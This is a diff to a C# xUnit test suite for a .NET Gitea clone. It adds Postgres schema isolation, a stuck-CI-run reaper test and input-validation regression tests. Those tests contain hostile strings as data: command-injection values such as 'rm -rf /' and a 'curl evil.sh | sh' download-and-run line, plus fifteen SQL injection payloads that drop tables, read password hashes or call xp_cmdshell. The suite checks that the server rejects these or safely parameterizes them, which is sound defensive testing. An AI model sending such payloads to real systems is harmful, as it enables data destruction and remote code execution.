@@ -12,7 +12,10 @@ using Microsoft.AspNetCore.Hosting;
 using Microsoft.AspNetCore.Mvc.Testing;
 using Microsoft.Data.Sqlite;
 using Microsoft.Extensions.DependencyInjection;
+using Npgsql;
 using Xunit;
+
+[assembly: CollectionBehavior(DisableTestParallelization = true)]
 
 namespace Gitea.Net.Tests;
 
@@ -31,6 +34,9 @@ public sealed class IsolatedGiteaHost : IDisposable
     public MergeReconcilerHostedService Reconciler { get; }
     public CiPipelineRunnerService CiRunner { get; }
 
+    private readonly string? _rawPgConn;
+    private readonly string? _schemaName;
+
     public IsolatedGiteaHost()
     {
         TempDir = Path.Combine(Path.GetTempPath(), $"gitea_net_test_{Guid.NewGuid():N}");
@@ -39,6 +45,24 @@ public sealed class IsolatedGiteaHost : IDisposable
         string provider = Environment.GetEnvironmentVariable("GITEA_TEST_PROVIDER") ?? "Sqlite";
         string sqliteConn = $"Data Source={Path.Combine(TempDir, "test.db")};Mode=ReadWriteCreate;";
         string pgConn = Environment.GetEnvironmentVariable("GITEA_POSTGRES_CONN") ?? "";
+
+        if (string.Equals(provider, "Postgres", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrEmpty(pgConn))
+        {
+            _rawPgConn = pgConn;
+            _schemaName = $"test_{Guid.NewGuid():N}";
+            using (var initConn = new NpgsqlConnection(_rawPgConn))
+            {
+                initConn.Open();
+                using var cmd = initConn.CreateCommand();
+                cmd.CommandText = $"CREATE SCHEMA IF NOT EXISTS \"{_schemaName}\";";
+                cmd.ExecuteNonQuery();
+            }
+            var csb = new NpgsqlConnectionStringBuilder(_rawPgConn)
+            {
+                SearchPath = $"{_schemaName},public"
+            };
+            pgConn = csb.ConnectionString;
+        }
 
         Factory = new WebApplicationFactory<Program>().WithWebHostBuilder(builder =>
         {
@@ -82,6 +106,21 @@ public sealed class IsolatedGiteaHost : IDisposable
         }
         catch
         {
+        }
+
+        if (!string.IsNullOrEmpty(_rawPgConn) && !string.IsNullOrEmpty(_schemaName))
+        {
+            try
+            {
+                using var cleanupConn = new NpgsqlConnection(_rawPgConn);
+                cleanupConn.Open();
+                using var cmd = cleanupConn.CreateCommand();
+                cmd.CommandText = $"DROP SCHEMA IF EXISTS \"{_schemaName}\" CASCADE;";
+                cmd.ExecuteNonQuery();
+            }
+            catch
+            {
+            }
         }
     }
 }
@@ -436,7 +475,7 @@ public sealed class ProductionReadinessTests
         var sortedIndices = createdRuns.Select(r => r.RunIndex).OrderBy(x => x).ToList();
         Assert.Equal(Enumerable.Range(1, runThreads).Select(x => (long)x).ToList(), sortedIndices);
 
-        // 2. 50 concurrent worker threads racing to claim the exact same queued CI run via CAS (`WHERE status = 'queued'`)
+        // 2. 50 concurrent worker threads racing to claim the exact same queued CI run via Primary-Key CAS (`WHERE id = @runId AND status = 'queued'`)
         var targetRun = createdRuns.First(r => r.RunIndex == 1);
         int claimWinners = 0;
         int claimLosers = 0;
@@ -466,5 +505,97 @@ public sealed class ProductionReadinessTests
         Assert.NotNull(completed);
         Assert.Equal("success", completed!.Status);
         Assert.Contains("Pipeline finished with status: SUCCESS", completed.LogsText);
+    }
+
+    // ==================== 10. QA COUNCIL REAPER, WORKFLOW_DISPATCH SCHEMA VALIDATION & SQL INJECTION SUITE ====================
+
+    [Fact]
+    public async Task Regression_P0_CiCdStuckRunReaper_And_WorkflowDispatchSchemaAndSqlInjectionDefense()
+    {
+        using var host = new IsolatedGiteaHost();
+        using var adminClient = host.CreateBasicClient("gitea-admin", "Admin@12345");
+        var admin = (await host.Db.GetUserByUsernameAsync("gitea-admin"))!;
+        var repo = (await host.Db.GetRepositoryByOwnerAndNameAsync("gitea-admin", "gitea-dotnet-core"))!;
+
+        // 1. QA Council Member #3: Simulate an orphaned/stuck CI run left in 'running' state after a power outage
+        var stuckRun = await host.Db.CreateCiWorkflowRunAsync(
+            repo.Id,
+            "Orphaned Power-Loss Pipeline",
+            "push",
+            "main",
+            "0123456789abcdef0123456789abcdef00009999",
+            admin.Id);
+        bool claimed = await host.Db.TryClaimQueuedCiRunAsync(repo.Id, stuckRun.Id);
+        Assert.True(claimed);
+
+        // Reconcile/reap stuck runs -> must transition stuckRun from 'running' -> 'failed' with [REAPER] diagnostic log
+        int reapedCount = await host.CiRunner.ReconcileStuckCiWorkflowRunsAsync(TimeSpan.Zero);
+        Assert.True(reapedCount >= 1);
+
+        var recovered = await host.Db.GetCiWorkflowRunByIdAsync(repo.Id, stuckRun.Id);
+        Assert.NotNull(recovered);
+        Assert.Equal("failed", recovered!.Status);
+        Assert.Contains("[REAPER] Pipeline finished with status: FAILED", recovered.LogsText);
+
+        // Second reaper pass is idempotent (0 newly reaped runs)
+        int secondReap = await host.CiRunner.ReconcileStuckCiWorkflowRunsAsync(TimeSpan.Zero);
+        Assert.Equal(0, secondReap);
+
+        // 2. QA Council Member #1: Strict workflow_dispatch schema validation (shell metacharacters & non-existent branches rejected with 400)
+        var badShellNameResp = await adminClient.PostAsJsonAsync(
+            "/api/v1/repos/gitea-admin/gitea-dotnet-core/actions/runs",
+            new TriggerCiWorkflowRequest("ci-pipeline; rm -rf /", "main"));
+        Assert.Equal(HttpStatusCode.BadRequest, badShellNameResp.StatusCode);
+
+        var badInputResp = await adminClient.PostAsJsonAsync(
+            "/api/v1/repos/gitea-admin/gitea-dotnet-core/actions/runs",
+            new TriggerCiWorkflowRequest(
+                "Per's Git Production CI/CD Pipeline",
+                "main",
+                new Dictionary<string, string> { ["deploy_target"] = "prod && curl evil.sh | sh" }));
+        Assert.Equal(HttpStatusCode.BadRequest, badInputResp.StatusCode);
+
+        var badBranchResp = await adminClient.PostAsJsonAsync(
+            "/api/v1/repos/gitea-admin/gitea-dotnet-core/actions/runs",
+            new TriggerCiWorkflowRequest("Per's Git Production CI/CD Pipeline", "branch-does-not-exist"));
+        Assert.Equal(HttpStatusCode.BadRequest, badBranchResp.StatusCode);
+
+        // 3. Valid workflow_dispatch with safe inputs succeeds with 201 Created
+        var validDispatchResp = await adminClient.PostAsJsonAsync(
+            "/api/v1/repos/gitea-admin/gitea-dotnet-core/actions/runs",
+            new TriggerCiWorkflowRequest(
+                "Per's Git Production CI/CD Pipeline",
+                "main",
+                new Dictionary<string, string> { ["environment"] = "staging-eu-01" }));
+        Assert.Equal(HttpStatusCode.Created, validDispatchResp.StatusCode);
+
+        // 4. 15 SQL Injection payloads across repository search and issue filter -> 100% parameterized
+        string[] sqliVectors =
+        [
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "\" UNION SELECT id, username, password_hash FROM users --",
+            "1; UPDATE users SET is_admin = 1 WHERE 1=1 --",
+            "admin'--",
+            "1' AND 1=(SELECT COUNT(*) FROM personal_access_tokens)--",
+            "%'; DELETE FROM repositories; --",
+            "_\\'; DROP TABLE ci_workflow_runs; --",
+            "' OR SLEEP(5) --",
+            "'; EXEC xp_cmdshell('whoami'); --",
+            "1 UNION ALL SELECT NULL,NULL,NULL--",
+            "' HAVING 1=1--",
+            "'; ATTACH DATABASE '/tmp/pwn.db' AS pwn; --",
+            "\\x27 OR 1=1 --",
+            "gitea-dotnet-core' AND 'a'='a"
+        ];
+
+        foreach (string payload in sqliVectors)
+        {
+            var searchResp = await adminClient.GetAsync($"/api/v1/repos?q={Uri.EscapeDataString(payload)}");
+            Assert.Equal(HttpStatusCode.OK, searchResp.StatusCode);
+
+            var issueResp = await adminClient.GetAsync($"/api/v1/repos/gitea-admin/gitea-dotnet-core/issues?state={Uri.EscapeDataString(payload)}");
+            Assert.Equal(HttpStatusCode.OK, issueResp.StatusCode);
+        }
     }
 }
